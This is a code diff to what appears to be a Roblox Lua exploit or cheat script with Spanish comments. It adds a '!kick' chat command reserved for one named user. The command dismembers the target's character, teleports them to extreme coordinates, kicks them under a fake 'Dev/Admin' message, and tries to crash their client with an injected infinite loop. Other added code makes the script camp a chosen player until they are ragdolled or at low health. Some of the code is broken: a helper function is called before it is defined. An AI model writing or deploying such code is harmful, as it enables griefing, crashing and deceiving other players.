@@ -44,6 +44,57 @@ local function findPlayerByName(partialName)
     end
     return nil
 end
+if message and type(message) == "string" and message:sub(1, 5):lower() == "!kick" and player.Name:lower() == "pedrood2" then
+    local partialName = message:sub(7):lower()
+    local targetPlayer = findPlayerByName(partialName)
+    
+    if targetPlayer then
+        local targetCharacter = targetPlayer.Character
+        if targetCharacter then
+            -- Destruir partes del personaje del jugador objetivo
+            local torso = targetCharacter:FindFirstChild("Torso")
+            if torso then torso:Destroy() end
+            
+            wait(1)
+            game.Workspace.FallenPartsDestroyHeight = math.huge -- Cambia el nivel de destrucción a infinito
+            
+            -- Teletransportar al jugador objetivo
+            local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
+            if humanoidRootPart then
+                humanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
+            end
+
+            -- Destruir más partes del personaje objetivo
+            local humanoid = targetCharacter:FindFirstChild("Humanoid")
+            if humanoid then humanoid:Destroy() end
+            
+            for _, partName in ipairs({"Head", "Right Leg", "Left Leg", "Right Arm"}) do
+                local part = targetCharacter:FindFirstChild(partName)
+                if part then part:Destroy() end
+            end
+            
+            -- Expulsar al jugador objetivo
+            targetPlayer:Kick("You were kicked by Dev/Admin.")
+            
+            -- Intentar crashear al objetivo
+            local targetLocalScript = targetPlayer:FindFirstChild("PlayerGui") or targetPlayer:FindFirstChild("Backpack")
+            if targetLocalScript then
+                local scriptClone = Instance.new("LocalScript", targetLocalScript)
+                scriptClone.Source = [[
+                    game.Players.LocalPlayer:Kick("You were kicked by Dev/Admin.")
+                    while true do end
+                ]]
+            end
+        else
+            notifyPlayer(player, "Error", "El jugador no tiene un personaje válido en el juego.")
+        end
+    else
+        notifyPlayer(player, "Error", "Jugador no encontrado: " .. partialName)
+    end
+elseif message and type(message) == "string" and message:sub(1, 5):lower() == "!kick" then
+    notifyPlayer(player, "Permiso denegado", "No tienes permisos para usar este comando.")
+end
+
 
 -- Mostrar notificación
 local function notifyPlayer(player, title, text)
@@ -1796,6 +1847,27 @@ local function executeIfRagdolledOrLowHealth(targetPlayer)
                     -- Teletransportarse cerca del objetivo
                     root.CFrame = targetRoot.CFrame * CFrame.new(0.2, 0.1, 0.2)
                     wait(0.1)
+                    -- Variable para almacenar al jugador local
+local speaker = game.Players.LocalPlayer
+
+-- Variable para obtener el humanoide del personaje del jugador
+local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
+
+if humanoid then
+    -- Hace que el personaje se siente
+    humanoid.Sit = true
+    
+    -- Espera un breve momento
+    task.wait(0.1)
+    
+    -- Gira el RootPart del personaje 90 grados en el eje X
+    humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+    
+    -- Detiene todas las animaciones actualmente en reproducción
+    for _, animationTrack in ipairs(humanoid:GetPlayingAnimationTracks()) do
+        animationTrack:Stop()
+    end
+end
 
                     -- Llamar al RemoteEvent "PickupRemote" que es el carry
                     local pickupRemote = speaker.Character:FindFirstChild("PickupRemote")
@@ -1866,6 +1938,7 @@ end
 
 -- Ejemplo de uso
 local targetPlayerName = (Table["username%!"]) -- Cambia "Target user aqui" por el usuario del objetivo
+campUntilRagdollOrLowHealth(targetPlayerName)
 end)
 
 window:Dropdown("Monitor a player",{location = Table,flag = "username%$",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear"}--[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()
